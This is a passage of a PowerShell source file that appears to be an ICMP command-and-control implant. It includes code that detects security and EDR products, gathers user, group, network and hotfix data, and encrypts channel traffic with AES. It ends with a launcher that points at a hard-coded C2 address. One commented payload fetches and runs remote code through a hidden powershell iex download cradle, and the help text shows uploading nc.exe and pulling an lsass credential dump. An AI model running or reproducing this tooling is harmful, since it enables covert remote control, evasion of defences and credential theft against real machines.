                  'sentinel',
                  'sepliveupdate'
                  'sisidsservice',
                  'sisipsservice',
                  'sisipsutil',
                  'smc.exe',
                  'smcgui',
                  'snac64',
                  'splunk',
                  'srtsp',
                  'symantec',
                  'symcorpui'
                  'symefasi',
                  'sysinternal',
                  'sysmon',
                  'tanium',
                  'tpython',
                  'windowssensor',
                  'wireshark'
                 );
        $edr = $edr_list
        $results += "[!] Checking current user integrity"
        $user = [Security.Principal.WindowsIdentity]::GetCurrent();
        $isadm = (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
        if ($isadm | Select-String -Pattern "True") {$results += "[+] Running as admin, all checks will be performed"}
        else {$results += "[-] Not running as admin, process metadata, registry and drivers will not be checked"}

        $results += ""
        $results += "[!] Checking running processes"
        if ($proc = Get-Process | Select-Object ProcessName,Name,Path,Company,Product,Description | Select-String -Pattern $edr -AllMatches)
        {ForEach ($p in $proc -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
        else {$results +=  "[+] No suspicious processes found"}

        $results +=  ""
        $results +=  "[!] Checking loaded DLLs in your current process"
        $procdll = Get-Process -Id $this.PID -Module
        if ($metadll = (Get-Item $procdll.FileName).VersionInfo | Select-Object CompanyName,FileDescription,FileName,InternalName,LegalCopyright,OriginalFileName,ProductName | Select-String -Pattern $edr -AllMatches)
        {ForEach ($p in $metadll -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
        else {$results +=  "[+] No suspicious DLLs loaded"}

        $results += ""
        $results += "[!] Checking Program Files"
        if ($prog = Get-ChildItem -Path 'C:\Program Files\*' | Select-Object Name | Select-String -Pattern $edr -AllMatches)
        {ForEach ($p in $prog -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
        else {$results += "[+] Nothing found in Program Files"}

        $results += ""
        $results += "[!] Checking Program Files x86"
        if ($prog86 = Get-ChildItem -Path 'C:\Program Files (x86)\*' | Select-Object Name | Select-String -Pattern $edr -AllMatches)
        {ForEach ($p in $prog86 -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
        else {$results +=  "[+] Nothing found in Program Files x86"}

        $results += ""
        $results += "[!] Checking Program Data"
        if ($progd = Get-ChildItem -Path 'C:\ProgramData\*' | Select-Object Name | Select-String -Pattern $edr -AllMatches)
        {ForEach ($p in $progd -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
        else {$results +=  "[+] Nothing found in Program Data"}

        if ($isadm | Select-String -Pattern "True")
        {
            $results += ""
            $results +=  "[!] Checking the registry"
            if ($reg = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\*' | Select-Object PSChildName,PSPath,DisplayName,ImagePath,Description | Select-String -Pattern $edr -AllMatches)
            {ForEach ($p in $reg -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
            else {$results += "[+] Nothing found in Registry"}

            $results += ""
            $results +=  "[!] Checking the drivers"
            if ($drv = fltmc instances | Select-String -Pattern $edr -AllMatches)
            {ForEach ($p in $drv -Replace "@{") {$results +=  "[-] $p".Trim("}")}}
            else {$results += "[+] No suspicious drivers found"}
        }
        return $results -join "`n";
    }
    [PSObject[]]GetUserInfo()
    {
        $results = @();
          Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime';EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}
          $arr = @()
          $Users = Get-WmiObject -Query "Select * from Win32_UserAccount Where LocalAccount = True"
          $results += ""
          $results += "======================"
          $results += "Local Users"
          $results += "======================"
          foreach ($usr in $Users) {
            $usr.Name
          }
          $GroupNames = Get-WmiObject -Query "SELECT * FROM Win32_Group Where LocalAccount = True"
          $results += ""
          $results += "======================"
          $results += "Local Groups"
          $results += "======================"
          foreach ($grp in $GroupNames) {
            $grp.Name
          }

          $hostname = (Get-WmiObject -Class Win32_ComputerSystem).Name
          $results += ""
          $results += "======================"
          $results += "Members of Local Groups"
          $results += "======================"

          foreach ($Group in $GroupNames) {
            $GroupName = $Group.Name
            $wmi = Get-WmiObject -Query "SELECT * FROM Win32_GroupUser WHERE GroupComponent=`"Win32_Group.Domain='$Hostname',Name='$GroupName'`""
            if ($wmi -ne $null)
            {
              foreach ($item in $wmi)
              {
                  $data = $item.PartComponent -split "\,"
                  $domain = ($data[0] -split "=")[1]
                  $name = ($data[1] -split "=")[1]
                  $arr += ("$domain\$name").Replace("""","")
                  [Array]::Sort($arr)
              }
            }
            if ($arr.Count -gt 0) {
                $results += ""
                $results += $GroupName
                $results += "======================"
                $results += $arr
            }
            $arr = @()
          }
        return $results;
    }
    [PSObject[]]GetComputerInfo(){
        $results = @();
        $Computer = "$env:COMPUTERNAME";
        $CompInfoSelProp = @(
            'Computer'
            'Domain'
            'OperatingSystem'
            'OSArchitecture'
            'BuildNumber'
            'ServicePack'
            'Manufacturer'
            'Model'
            'SerialNumber'
            'Processor'
            'LogicalProcessors'
            'PhysicalMemory'
            'OSReportedMemory'
            'PAEEnabled'
            'InstallDate'
            'LastBootUpTime'
            'UpTime'
            'RebootPending'
            'RebootPendingKey'
            'CBSRebootPending'
            'WinUpdRebootPending'
            'LogonServer'
            'PageFile'
        )

        $NetInfoSelProp = @(
            'NICName'
            'NICManufacturer'
            'DHCPEnabled'
            'MACAddress'
            'IPAddress'
            'IPSubnetMask'
            'DefaultGateway'
            'DNSServerOrder'
            'DNSSuffixSearch'
            'PhysicalAdapter'
            'Speed'
        )

        $VolInfoSelProp = @(
            'DeviceID'
            'VolumeName'
            'VolumeDirty'
            'Size'
            'FreeSpace'
            'PercentFree'
        )

        Try {
                $WMI_PROC = Get-WmiObject -Class Win32_Processor -ComputerName $Computer
                $WMI_BIOS = Get-WmiObject -Class Win32_BIOS -ComputerName $Computer
                $WMI_CS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Computer
                $WMI_OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer
                $WMI_PM = Get-WmiObject -Class Win32_PhysicalMemory -ComputerName $Computer
                $WMI_LD = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType = '3'" -ComputerName $Computer
                $WMI_NA = Get-WmiObject -Class Win32_NetworkAdapter -ComputerName $Computer
                $WMI_NAC = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=$true" -ComputerName $Computer
                $WMI_HOTFIX = Get-WmiObject -Class Win32_quickfixengineering -ComputerName $Computer
                $WMI_NETLOGIN = Get-WmiObject -Class win32_networkloginprofile -ComputerName $Computer
                $WMI_PAGEFILE = Get-WmiObject -Class Win32_PageFileUsage

                $RegCon = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]'LocalMachine',$Computer)
                $WinBuild = $WMI_OS.BuildNumber
                $CBSRebootPend, $RebootPending = $false, $false
                If ([INT]$WinBuild -ge 6001)
                {
                    $RegSubKeysCBS  = $RegCon.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\').GetSubKeyNames()
                    $CBSRebootPend  = $RegSubKeysCBS -contains 'RebootPending'
                    $OSArchitecture = $WMI_OS.OSArchitecture
                    $LogicalProcs   = $WMI_CS.NumberOfLogicalProcessors
                }
                Else
                {
                    $OSArchitecture = '**Unavailable**'
                    If ($WMI_PROC.Count -gt 1)
                    {
                        $LogicalProcs = $WMI_PROC.Count
                    }
                    Else
                    {
                        $LogicalProcs = 1
                    }
                }

                $RegSubKeySM      = $RegCon.OpenSubKey('SYSTEM\CurrentControlSet\Control\Session Manager\')
                $RegValuePFRO     = $RegSubKeySM.GetValue('PendingFileRenameOperations',$false)
                $RegWindowsUpdate = $RegCon.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\').GetSubKeyNames()
                $WUAURebootReq    = $RegWindowsUpdate -contains 'RebootRequired'
                $RegCon.Close()

                If ($CBSRebootPend -or $RegValuePFRO -or $WUAURebootReq)
                {
                    $RebootPending = $true
                }

                [int]$Memory  = ($WMI_PM | Measure-Object -Property Capacity -Sum).Sum / 1MB
                $InstallDate  = ([WMI]'').ConvertToDateTime($WMI_OS.InstallDate)
                $LastBootTime = ([WMI]'').ConvertToDateTime($WMI_OS.LastBootUpTime)
                $UpTime       = New-TimeSpan -Start $LastBootTime -End (Get-Date)

                $PAEEnabled = $false
                If ($WMI_OS.PAEEnabled)
                {
                    $PAEEnabled = $true
                }
                $results += New-Object PSObject -Property @{
                    Computer            = $WMI_CS.Name
                    Domain              = $WMI_CS.Domain.ToUpper()
                    OperatingSystem     = $WMI_OS.Caption
                    OSArchitecture      = $OSArchitecture
                    BuildNumber         = $WinBuild
                    ServicePack         = $WMI_OS.ServicePackMajorVersion
                    Manufacturer        = $WMI_CS.Manufacturer
                    Model               = $WMI_CS.Model
                    SerialNumber        = $WMI_BIOS.SerialNumber
                    Processor           = ($WMI_PROC | Select-Object -ExpandProperty Name -First 1)
                    LogicalProcessors   = $LogicalProcs
                    PhysicalMemory      = $Memory
                    OSReportedMemory    = [int]$($WMI_CS.TotalPhysicalMemory / 1MB)
                    PAEEnabled          = $PAEEnabled
                    InstallDate         = $InstallDate
                    LastBootUpTime      = $LastBootTime
                    UpTime              = $UpTime
                    RebootPending       = $RebootPending
                    RebootPendingKey    = $RegValuePFRO
                    CBSRebootPending    = $CBSRebootPend
                    WinUpdRebootPending = $WUAURebootReq
                    LogonServer         = $ENV:LOGONSERVER
                    PageFile            = $WMI_PAGEFILE.Caption
                } | Select-Object $CompInfoSelProp

                $results +=  "Network Adaptors`n"
                Foreach ($NAC in $WMI_NAC)
                {
                    $NetAdap = $WMI_NA | Where-Object {
                        $NAC.Index -eq $_.Index
                    }

                    If ($WinBuild -ge 6001)
                    {
                        $PhysAdap = $NetAdap.PhysicalAdapter
                        $Speed    = '{0:0} Mbit' -f $($NetAdap.Speed / 1000000)
                    }
                    Else
                    {
                        $PhysAdap = '**Unavailable**'
                        $Speed    = '**Unavailable**'
                    }

                    $results += New-Object PSObject -Property @{
                        NICName         = $NetAdap.Name
                        NICManufacturer = $NetAdap.Manufacturer
                        DHCPEnabled     = $NAC.DHCPEnabled
                        MACAddress      = $NAC.MACAddress
                        IPAddress       = $NAC.IPAddress
                        IPSubnetMask    = $NAC.IPSubnet
                        DefaultGateway  = $NAC.DefaultIPGateway
                        DNSServerOrder  = $NAC.DNSServerSearchOrder
                        DNSSuffixSearch = $NAC.DNSDomainSuffixSearchOrder
                        PhysicalAdapter = $PhysAdap
                        Speed           = $Speed
                    } | Select-Object $NetInfoSelProp
                }

                $results +=  "Disk Information`n"
                Foreach ($Volume in $WMI_LD)
                {
                    $results += New-Object PSObject -Property @{
                        DeviceID    = $Volume.DeviceID
                        VolumeName  = $Volume.VolumeName
                        VolumeDirty = $Volume.VolumeDirty
                        Size        = $('{0:F} GB' -f $($Volume.Size / 1GB))
                        FreeSpace   = $('{0:F} GB' -f $($Volume.FreeSpace / 1GB))
                        PercentFree = $('{0:P}' -f $($Volume.FreeSpace / $Volume.Size))
                    } | Select-Object $VolInfoSelProp
                }
                $results += "Hotfix(s) Installed: $($WMI_HOTFIX.Count)`n"
                $results += $WMI_HOTFIX|Select-Object -Property Description, HotfixID, InstalledOn
            }
            Catch
            {
                $results +=  "$_"
            }
        return $results;

    }
    [String[]]GetOptions(){
        $results = @();
        $results += $this.PSObject.Members|
                where MemberType -eq Method|
                where Name -notmatch "_"|select Name;
        return ($results).Name;
    }
    [String]Help(){
        $result = "";
        $result += "C2 Commands: `n`n";
        $result += $this.Options -join "`n";
        $result += "`n`nClient Usage: `n`n";
        $result += "Upload file: put_file /tmp/nc.exe c:/temp/nc.exe`n";
        $result += "Download file: get_file c:/temp/lsass.dmp /tmp/lsass.dmp`n";
        $result += "Invoke file: invoke_file /tmp/InjectShellcode.ps1`n";
        $result += "Authenticate: auth P@ssword!`n";
        $result += "`n`n"
        return $result;
    }
    [String]CreateKey(){
        $result = "";
        try {
          $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged";
        } catch {
          $aesManaged = New-Object "System.Security.Cryptography.AesCryptoServiceProvider";
        }
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $result += "Key "
        $result += [System.Convert]::ToBase64String($aesManaged.Key);
        $result += " IV "
        $result += [System.Convert]::ToBase64String($aesManaged.IV);
        return $result;
    }
    [PSObject]CreateAesManagedObject([String]$key, [Byte[]]$IV) {
        try {
          $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged";
        } catch {
          $aesManaged = New-Object "System.Security.Cryptography.AesCryptoServiceProvider";
        }
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        $aesManaged.IV = $IV;
        $aesManaged.Key = [System.Convert]::FromBase64String($key);
        return $aesManaged
    }
    [String]EncryptString([String]$key, [String]$unencryptedString) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
        $fullData = $this.EncryptBytes($key, $bytes);
        return [System.Convert]::ToBase64String($fullData);
    }
    [Byte[]]EncryptBytes([String]$key, [Byte[]]$bytes) {
        $IV = $bytes[0..15];
        $aesManaged = $this.CreateAesManagedObject($key, $IV);
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]]$fullData = $aesManaged.IV + $encryptedData
        return $fullData
    }
    [String]DecryptString([String]$key,[String]$encryptedStringWithIV) {
        $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
        $unencryptedData = $this.DecryptBytes($key, $bytes);
        return [System.Text.Encoding]::UTF8.GetString(
                [System.Convert]::FromBase64String(
                    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0))
        );
    }
    [byte[]]DecryptBytes([String]$key,[Byte[]]$bytes) {
        $IV = $bytes[0..15]
        $aesManaged = $this.CreateAesManagedObject($key, $IV);
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        return $unencryptedData;
    }
    [ICMPShell]EncryptFile([String]$key, [String]$source, [String]$destination){
        $bytes = [System.IO.File]::ReadAllBytes($source);
        $encbytes = $this.EncryptBytes($key, $bytes);
        [System.IO.File]::WriteAllBytes($destination, $encbytes);
        return $this;
    }
    [ICMPShell]DecryptFile([String]$key, [String]$source, [String]$destination){
        $bytes = [System.IO.File]::ReadAllBytes($source);
        $decbytes = $this.DecryptBytes($key, $bytes);
        [System.IO.File]::WriteAllBytes($destination, $decbytes);
        return $this;
    }
    [PSObject[]]Survey(){
        $results = @();
        $results += "`n********** ADMINISTRATOR **********`n";
        $results += $this.TestAdministrator();
        $results += "`n********** USER **********`n";
        $results += $this.GetUserInfo();
        $results += "`n********** ARCHITECTURE **********`n";
        $results += $this.CheckArchitecture();
        $results += "`n********** PS VERSION **********`n";
        $results += $this.CheckVersionTwo();
        $results += "`n********** DEFENSES **********`n";
        $results += $this.InvokeEDRChecker();
        $results += "`n********** COMPUTER**********`n";
        $results += $this.GetComputerInfo();
        $this.Info = $results;
        return $results;
    }
}
function Invoke-Shell
{
    ## default C2 configuration:
    $c2Server = "10.49.117.253"; # default C2 server
    #$password = "PWN"; # using a password/key requires auth
    $password = ""; # blank password doesn't require auth
    $psVersion = $PSVersionTable.psversion.Major; # hacky way of setting PS version
    #$payload = "powershell -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('https://$($c2Server)/icmp_server.ps1'))";
    $payload = "powershell -exec bypass -noninteractive -windowstyle hidden -c iex(gc C:\windows\temp\icmp_server.ps1|out-string)";
    $shell = [ICMPShell]::New($c2Server, $password, $PID, $psVersion, $payload);

    ## fallback network configuration:
    #$networkAddress = "10.49.117.244"; # network or host IP
    #$networkMask = "255.255.254.0";    # subnet mask to calculate fallback IPs
    #$shell.SetFallbackCIDR($networkAddress, $networkMask); # sets the fallback IPs
    ## fallback IP list configuration:
    #$c2Servers = @("10.49.117.253", "10.49.117.252", "10.49.117.251"); # pass an array of IPs
    #$shell.SetFallbackIPs($c2Servers); # sets the fallback IPs

    # start the C2 server:
    $shell.InvokeShell();
}
Invoke-Shell
